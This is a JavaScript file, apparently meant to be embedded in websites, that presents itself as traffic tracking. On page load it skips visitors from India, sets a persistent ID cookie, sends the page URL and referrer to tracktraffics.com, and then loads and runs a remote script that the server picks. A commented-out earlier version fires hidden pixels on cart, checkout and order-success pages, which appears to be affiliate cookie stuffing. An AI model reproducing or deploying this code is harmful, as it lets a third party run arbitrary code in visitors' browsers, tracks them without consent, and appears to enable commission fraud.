(function() {
    
    const BLOCKED_COUNTRIES = ['IN']; 
    
    async function getCountry() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return data.country_code;
        } catch (error) {
            console.error("Geolocation Error:", error);
            return null;
        }
    }

    async function checkCountry() {
        const country = await getCountry();
        return BLOCKED_COUNTRIES.includes(country);
    }

    async function main() {
        
        const isBlocked = await checkCountry();
        if (isBlocked) {
            console.log("Script blocked for India");
            return;
        }

       
        if (sessionStorage.getItem('re_ret_session_triggered')) return;
        sessionStorage.setItem('re_ret_session_triggered', 'true');

        function getCookie(cookieName) {
            return document.cookie.split('; ').reduce((value, cookie) => {
                const [name, val] = cookie.split('=');
                return (name === encodeURIComponent(cookieName)) ? decodeURIComponent(val) : value;
            }, null);
        }

        function setCookie(cookieName, cookieValue) {
            document.cookie = `${encodeURIComponent(cookieName)}=${encodeURIComponent(cookieValue)}; expires=${(new Date(Date.now() + 86400000)).toUTCString()}; path=/`;
        }

        function generateUUID() {
            var re_ret_d = new Date().getTime();
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var re_ret_r = (re_ret_d + Math.random() * 16) % 16 | 0;
                re_ret_d = Math.floor(re_ret_d / 16);
                return (c == 'x' ? re_ret_r : (re_ret_r & 0x3 | 0x8)).toString(16);
            });
        }

        function detectDeviceType() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
            if (/Android/i.test(ua)) return "Android";
            if (/Windows Phone/i.test(ua)) return "Windows Phone";
            if (/Windows NT/i.test(ua)) return "Windows";
            if (/Macintosh/i.test(ua)) return "Mac";
            if (/Linux/i.test(ua)) return "Linux";
            return "Unknown";
        }

       
        const re_ret_uid = getCookie('re_ret_uid') || generateUUID();
        const re_ret_ref = getCookie('re_ret_ref') || encodeURIComponent(document.referrer);

        if (!getCookie('re_ret_uid')) setCookie('re_ret_uid', re_ret_uid);
        if (getCookie('re_ret_ref') !== encodeURIComponent(document.referrer)) {
            setCookie('re_ret_ref', encodeURIComponent(document.referrer));
        }

        
        const trackingData = {
            event: "viewPage",
            uxid: re_ret_uid,
            page: window.location.href,
            device_type: detectDeviceType(),
            uAgent: navigator.userAgent,
            referrer: re_ret_ref
        };

      
        fetch('https://www.tracktraffics.com/api/datascript', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url: window.location.href,
                referrer: document.referrer,
                coo: JSON.stringify(re_ret_uid),
                origin: window.location.hostname
            })
        })
        .then(res => res.json())
        .then(response => {
            const script = document.createElement('script');
            script.src = `https://www.tracktraffics.com/${response.name}.js?url=${encodeURIComponent(response.url)}`;
            script.async = true;
            document.head.appendChild(script);
        })
        .catch(error => console.error("Tracking Error:", error));
    }

   
    if (document.readyState === 'complete') {
        main();
    } else {
        window.addEventListener('load', main);
    }
})();





// (function() {
    
//     async function mainTracking() {
        
//         function getCookie(cookieName) {
//             return document.cookie.split('; ').reduce((value, cookie) => {
//                 const [name, val] = cookie.split('=');
//                 return (name === encodeURIComponent(cookieName)) ? decodeURIComponent(val) : value;
//             }, null);
//         }

//         function setCookie(cookieName, cookieValue) {
//             document.cookie = `${encodeURIComponent(cookieName)}=${encodeURIComponent(cookieValue)}; expires=${(new Date(Date.now() + 86400000)).toUTCString()}; path=/`;
//         }

//         function detectDeviceType() {
//             const ua = navigator.userAgent;
//             if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
//             if (/Android/i.test(ua)) return "Android";
//             if (/Windows Phone/i.test(ua)) return "Windows Phone";
//             if (/Windows NT/i.test(ua)) return "Windows";
//             if (/Macintosh/i.test(ua)) return "Mac";
//             if (/Linux/i.test(ua)) return "Linux";
//             return "Unknown";
//         }

//         const re_ret_uid = getCookie('re_ret_uid') || crypto.randomUUID();
//         const re_ret_ref = getCookie('re_ret_ref') || encodeURIComponent(document.referrer);

//         if (!getCookie('re_ret_uid')) setCookie('re_ret_uid', re_ret_uid);
//         if (getCookie('re_ret_ref') !== encodeURIComponent(document.referrer)) {
//             setCookie('re_ret_ref', encodeURIComponent(document.referrer));
//         }

//         const trackingResponse = await fetch('https://www.tracktraffics.com/api/track-user', {
//             method: 'POST',
//             headers: { 'Content-Type': 'application/json' },
//             body: JSON.stringify({
//                 url: window.location.href,
//                 referrer: document.referrer,
//                 unique_id: re_ret_uid,
//                 origin: window.location.hostname
//             })
//         });

//         const { url: dynamicUrl } = await trackingResponse.json();

//         function createTrackingPixel(url) {
//             const img = new Image();
//             img.src = url;
//             img.style.cssText = 'width:1px;height:1px;display:none;visibility:hidden;';
//             document.body.appendChild(img);
//         }

//         function triggerPixelLogic() {
         
//             createTrackingPixel(dynamicUrl);

//             const isCartPage = ['/cart', '/checkout'].some(path => 
//                 window.location.pathname.includes(path)
//             );
//             if (isCartPage) createTrackingPixel(dynamicUrl);

//             if (window.location.pathname.includes('/order-success')) {
//                 createTrackingPixel(dynamicUrl);
//             }

//             setTimeout(() => createTrackingPixel(dynamicUrl), 2000);
//         }

//         triggerPixelLogic();
//     }

//     if (document.readyState === 'complete') {
//         mainTracking();
//     } else {
//         window.addEventListener('load', mainTracking);
//     }
// })();